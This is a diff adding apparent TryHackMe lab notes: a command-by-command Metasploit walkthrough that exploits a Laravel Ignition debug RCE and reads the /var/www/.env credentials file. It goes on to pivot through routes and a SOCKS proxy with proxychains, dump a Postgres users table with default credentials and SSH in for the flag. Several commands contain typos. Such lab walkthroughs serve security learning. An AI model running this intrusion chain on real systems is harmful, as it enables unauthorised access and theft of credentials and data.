@@ -1,0 +1,82 @@
+#connect to thm openvpn
+sudo openvpn <Path/to/opvn/file>
+
+export IP=<IP>
+
+mkdir nmap
+
+#scan the network with nmap tool and log output to nmap/inital.log file
+namp -T4 -Pn -A $IP -o namp/initial.log
+
+#open msfconsole
+msfconsole
+#use the vulnerability
+use multi/php/ignition_laravel_rec
+#check for availability and vulnerability of rhsot
+check rhost=<IP> HttpClientTimeout=20
+#create and execute the script on rhost
+run lhost=<Your.IP> rhost=<IP> HttpClientTimeout=20
+
+#background this session by msfconsole
+background (Yes if prompted)
+sessions
+#create a new meterpreter session in the victim machine
+sessions -u -1
+sessions (see the difference on what sessions are present and created)
+
+#connect to the last opened session
+sessions -i -1
+#cat all the env variables
+cat /var/www/.env
+
+#to resolve the remote hostname to an IP address that we can ues for attacking 
+resolve webservice_database 
+
+#make the meterpreter process as background process
+background (yes if prompted)
+
+#route the network traffic to the local IP of the attacked client
+route add <IP/with/subnet> -1
+
+
+#add another route this is for docker env file which essentially contains the hardcoded IP address of the local IP of the attacked machine
+route add <ip/complete/subnet> -1
+
+#see all the routes that are currently used for routing
+route print
+
+#dumpt the postgres schema
+use auxiliary/scanner/postgres/postgres_schemadump
+run postgres://postgres:postgres@<IP>/postgres
+
+#select the information from the sql table
+use auxiliary/admin/postgres/postgres_sql
+run postgres://postgres:postgres@<IP>/postgres sql='select * from users'
+#the output will be all the data in the users table from the database
+
+
+#to futher pivot through the private network, we can create a socks proxy within metasploit
+#from msfconsole run the commands
+use auxiliary/server/socks_proxy
+run srvhost-127.0.0.1 srvport=9050 version=4a
+
+#from the attackers host machine, we can use proxychains to scan the comproimsed host machine for common ports
+proxychains -q namp -n -sT -p 22,80,443,5432 172.17.0.1
+
+#ssh in to docker image and find the flag
+use auxiliary/scanner/ssh/ssh_login
+run ssh://<username>:<password>@<IP>
+
+#once the above commands are executed perfectly, run sessions command to check whether new ssh session is added or not
+sessions
+
+#connect to this ssh session
+session -i -1
+
+
+#namp results have the details about the open ports and what framework is being used
+#password and credentials are found when we exploit the postgres admin access script
+#root flag is found in the santa ssh machine
+#CVE of the framework can be found in the msfconsole - go to the script and execute info command
+use multi/php/ignition_laravel_debug_rce
+info
